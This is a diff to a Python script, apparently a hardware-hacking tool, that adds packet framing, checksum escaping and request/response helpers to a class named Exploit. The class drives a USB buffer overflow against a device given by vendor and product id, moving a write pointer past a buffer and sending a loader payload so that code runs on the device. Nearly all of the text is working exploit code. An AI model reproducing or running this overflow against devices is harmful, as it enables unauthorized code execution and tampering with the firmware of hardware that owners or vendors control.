@@ -82,10 +82,55 @@ def mask_payload(buf):
     return bytes(output)
 
 
+def mask_packet(pkt):
+    out = [0xFF]
+    ck = 0
+    for b in pkt:
+        if b in [0xFD, 0xFE, 0xFF]:
+            out.append(0xFD)
+            out.append(b ^ 0x10)
+        else:
+            out.append(b)
+        ck += b
+    ck = (-ck) & 0xFF
+    if ck in [0xFD, 0xFE, 0xFF]:
+        out.append(0xFD)
+        out.append(ck ^ 0x10)
+    else:
+        out.append(ck)
+    out.append(0xFE)
+
+    return bytearray(out)
+
+
+def make_packet(cmd, subcmd, variable_payload=None):
+    if variable_payload is None:
+        variable_payload = b""
+    packet = struct.pack("<BBBHBBBB", 0xE9, 0xE3, 0x42, 6 + len(variable_payload), 0, 0, cmd, subcmd) + variable_payload
+    return mask_packet(packet)
+
+
+def unmask_resp(resp):
+    assert resp[0] == 0xFF
+    assert resp[-1] == 0xFE
+    resp = resp[1:-1]
+    out = []
+    x = 0
+    while x < len(resp):
+        if resp[x] == 0xFD:
+            out.append(resp[x+1] ^ 0x10)
+            x += 2
+        else:
+            out.append(resp[x])
+            x += 1
+    return bytearray(out)
+
+
 class Exploit:
 
     def __init__(self):
         parser = argparse.ArgumentParser()
+        parser.add_argument('--iplmts', action='store_true')
         parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
         parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)
         parser.add_argument('--stage1', type=lambda x: int(x, 16), required=True)
@@ -109,12 +154,33 @@ class Exploit:
         self.payload = loader + mask_payload(payload)
         while len(self.payload) % 4 != 0:
             self.payload += b"\x00"
+        print("payload size: 0x{:X}".format(len(self.payload)))
 
     def write_fully(self, buffer):
         assert b"\xFE" not in buffer and b"\xFF" not in buffer
-        for x in range(0, len(buffer), 64):
-            chunk = buffer[x:x+64]
-            assert self.dev.write(8, chunk) == len(chunk)
+
+        total = 0
+        try:
+            for x in range(0, len(buffer), 64):
+                chunk = buffer[x:x+64]
+                assert self.dev.write(8, chunk) == len(chunk)
+                total += len(chunk)
+        except Exception:
+            print("wrote 0x{:X} bytes at the moment of exception".format(total))
+            raise
+
+    def comm_oneway(self, cmd, subcmd=0, variable_payload=None):
+        pkt = make_packet(cmd, subcmd, variable_payload)
+        ret = self.dev.write(0x8, pkt)
+
+    def comm(self, cmd, subcmd=0, variable_payload=None):
+        self.comm_oneway(cmd, subcmd, variable_payload)
+        resp = b""
+        while True:
+            resp += self.dev.read(0x87, 64)
+            if resp.endswith(b"\xFE"):
+                break
+        return unmask_resp(resp)
 
     def run(self):
         print("=" * 80)
@@ -135,10 +201,17 @@ class Exploit:
         time.sleep(3)
         self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
 
+        if self.args.iplmts:
+            print("Enter iplmts")
+            self.comm(0x03, subcmd=0, variable_payload=b"\x20")
+
         print("1) move writeptr behind buffer")
         overflow_payload = b""
         for x in range(self.args.stage1 // 4):
-            bdata = struct.pack("<I", len(overflow_payload) | self.args.stage1_mask)
+            if x == 0:
+                bdata = b"\xFD\xFD\xFD\xFD"
+            else:
+                bdata = struct.pack("<I", len(overflow_payload) | self.args.stage1_mask)
             if b"\xFF" in bdata or b"\xFE" in bdata:
                 bdata = b"\x42\x42\x42\x42"
             overflow_payload += bdata
@@ -173,7 +246,7 @@ class Exploit:
 
         # trigger code exec (may not be required)
         try:
-            self.dev.write(8, b"\xFE")
+            self.dev.write(8, b"\xFE\xFD\xFD\xFE")
         except Exception:
             print("check the display in case exploit succeeded anyway; if not, recheck the arguments")
             raise
